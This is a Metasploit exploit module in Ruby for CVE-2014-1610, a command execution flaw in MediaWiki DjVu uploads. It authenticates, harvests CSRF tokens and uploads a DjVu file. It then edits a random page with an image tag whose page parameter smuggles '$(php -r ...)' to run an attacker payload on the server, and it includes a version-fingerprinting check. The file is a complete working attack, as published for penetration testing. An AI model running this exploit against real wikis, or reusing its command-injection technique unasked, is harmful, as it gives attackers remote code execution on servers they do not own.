##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MediaWiki DjVu Authenticated Remote Command Execution',
      'Description' => %q{
        MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11,
      when DjVu file upload support is enabled, allows remote authenticated
      users to execute arbitrary commands via shell metacharacters in the page
      parameter to includes/media/DjVu.php
      },
      'Author' =>
        [
          'Netanel Rubin', # from Check Point - Discovery
          'Ben Harris', # Metasploit Module
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2014-1610' ],
          [ 'OSVDB', '102630'],
          [ 'URL', 'http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html' ],
          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=60339' ]
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP, # Could do ARCH_CMD
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'Payload' =>
        {
          'BadChars' => "\r\n"
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 28 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base index.php path", '/index.php']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", '']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ], self.class)
  end

  def check
    uri = target_uri.path

    response = send_request_cgi({
      'uri' => normalize_uri(uri, 'Main_Page')
    })

    if response and response.code == 200
      response_html = Nokogiri::HTML(response.body)
      meta_generator = response_html.xpath("//meta[@name='generator']").first['content']

      if meta_generator && meta_generator =~ /mediawiki/i
        vprint_status("#{meta_generator} detected.")
        meta_generator =~ /(\d)\.(\d)+\.(\d)+/
        major = $1.to_i
        minor = $2.to_i
        patch = $3.to_i
        vprint_status("Major:#{major} Minor:#{minor} Patch:#{patch}")

        if major != 1
          return CheckCode::Safe
        else
          if minor < 8 || minor > 22
            return CheckCode::Safe
          else
            if minor == 22 && patch > 1
              return CheckCode::Safe
            elsif minor == 21 && patch > 4
              return CheckCode::Safe
            elsif minor == 19 && patch > 10
              return CheckCode::Safe
            else
              return CheckCode::Appears
            end
          end
        end
      end
    else
      return Exploit::CheckCode::Detected
    end
  end

  def exploit
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    uri = target_uri.path

    print_status("Grabbing login CSRF token...")
    response = send_request_cgi({
      'uri' => uri,
      'vars_get' => { 'title' => 'Special:UserLogin' }
    })

    unless response
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    session_cookie = response.get_cookies

    response_html = Nokogiri::HTML(response.body)
    wp_login_token = get_token_value(response_html, 'wpLoginToken')

    unless wp_login_token
      fail_with(Failure::NotFound, "Couldn't find login token. Is URI set correctly?")
    else
      print_good("Retrieved login CSRF token.")
    end

    print_status("Attempting to login...")
    login = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'vars_get' => {
        'title' => 'Special:UserLogin',
        'action' => 'submitlogin',
        'type' => 'login'
      },
      'cookie' => session_cookie,
      'vars_post' => {
        'wpName' => username,
        'wpPassword' => password,
        'wpLoginAttempt' => 'Log+in',
        'wpLoginToken' => wp_login_token
      }
    })

    if login and login.code == 302
      print_good("Log in successful.")
    else
      fail_with(Failure::NotFound, "Failed to log in.")
    end

    auth_cookie = login.get_cookies.gsub('mediawikiToken=deleted;','')

    print_status("Getting upload CSRF token...")
    upload_file = send_request_cgi({
      'uri' => normalize_uri(uri, "/Special:Upload"),
      'cookie' => auth_cookie
    })

    unless upload_file and upload_file.code == 200
      fail_with(Failure::NotFound, "Failed to access file upload page.")
    end

    upload_file_html = Nokogiri::HTML(upload_file.body)
    wp_edit_token = get_token_value(upload_file_html, 'wpEditToken')
    wp_upload = get_token_value(upload_file_html, 'wpUpload')
    title = get_token_value(upload_file_html, 'title')

    unless wp_edit_token
      fail_with(Failure::NotFound, "Couldn't find upload token. Is URI set correctly?")
    else
      print_good("Retrieved upload CSRF token.")
    end

    upload_mime = Rex::MIME::Message.new

    djvu_file = ::File.read(::File.join(Msf::Config.data_directory, "exploits", "cve-2014-1610", "metasploit.djvu"))
    file_name = "#{rand_text_alpha(4)}.djvu"

    upload_mime.add_part(djvu_file, "application/octet-stream", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{file_name}\"")
    upload_mime.add_part("#{file_name}", nil, nil, "form-data; name=\"wpDestFile\"")
    upload_mime.add_part("#{rand_text_alpha(4)}", nil, nil, "form-data; name=\"wpUploadDescription\"")
    upload_mime.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    upload_mime.add_part("1",nil,nil, "form-data; name=\"wpIgnoreWarning\"")
    upload_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"")
    upload_mime.add_part(title, nil, nil, "form-data; name=\"title\"")
    upload_mime.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    upload_mime.add_part(wp_upload, nil, nil, "form-data; name=\"wpUpload\"")
    post_data = upload_mime.to_html

    print_status("Uploading DjVu file #{file_name}...")

    upload = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "Special:Upload"),
      'data'   => post_data,
      'ctype'  => "multipart/form-data; boundary=#{upload_mime.bound}",
      'cookie' => auth_cookie
    })

    if upload and upload.code == 302 and upload.headers['Location']
      location = upload.headers['Location']
      print_good("File uploaded to #{location}")
    else
      fail_with(Failure::Unknown, "Failed to upload file.")
    end

    random_page = rand_text_alpha(8)

    print_status("Retrieving edit CSRF token for target page: #{random_page}...")
    random_edit = send_request_cgi({
      'uri' => uri,
      'vars_get' => {
        'title'=> random_page,
        'action' => 'edit'
      },
      'cookie' => auth_cookie
    })

    unless random_edit and random_edit.code == 200
      fail_with(Failure::Unknown, "Failed to open target edit page: #{random_page}.")
    end

    random_html = Nokogiri::HTML(random_edit.body)

    wp_auto_summary = get_token_value(random_html, 'wpAutoSummary')
    wp_edit_token = get_token_value(random_html, 'wpEditToken')
    wp_start_time = get_token_value(random_html, 'wpStarttime')
    wp_edit_time = get_token_value(random_html, 'wpEdittime')
    old_id = get_token_value(random_html, 'oldid')
    wp_scroll_top = get_token_value(random_html, 'wpScrolltop')
    wp_section = get_token_value(random_html, 'wpSection')

    if wp_edit_token
      print_good("Retrieved edit CSRF token.")
    else
      fail_with(Failure::Unknown, "Failed to retrieve edit CSRF token.")
    end

    edit_mime = Rex::MIME::Message.new
    edit_mime.add_part(wp_section, nil, nil, "form-data; name=\"wpSection\"")
    edit_mime.add_part(wp_start_time, nil, nil, "form-data; name=\"wpStarttime\"")
    edit_mime.add_part(wp_edit_time, nil, nil, "form-data; name=\"wpEdittime\"")
    edit_mime.add_part(wp_scroll_top, nil, nil, "form-data; name=\"wpScrolltop\"")
    edit_mime.add_part(wp_auto_summary,nil,nil, "form-data; name=\"wpAutoSummary\"")
    edit_mime.add_part(old_id, nil, nil, "form-data; name=\"oldid\"")
    edit_mime.add_part("[[Image:#{file_name}|width=9999|page=1$(php -r '#{payload.encoded}')]]", nil, nil, "form-data; name=\"wpTextbox1\"")
    edit_mime.add_part("Save page", nil, nil, "form-data; name=\"wpSummary\"")
    edit_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"")
    post_data = edit_mime.to_html

    print_status("Sending payload request...")
    edit = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'cookie' => auth_cookie,
      'vars_get' => {
        'title' => random_page,
        'action' => 'submit'
      },
      'data'   => post_data,
      'ctype'  => "multipart/form-data; boundary=#{edit_mime.bound}"
    }, 1)

    if edit
      print_error("Payload probably failed...")
    end
  end

  def get_token_value(document, value_name)
    return nil unless document
    return nil unless value_name
    node = document.xpath("//input[@name='#{value_name}']")
    return nil unless node
    node.first['value']
  end
end

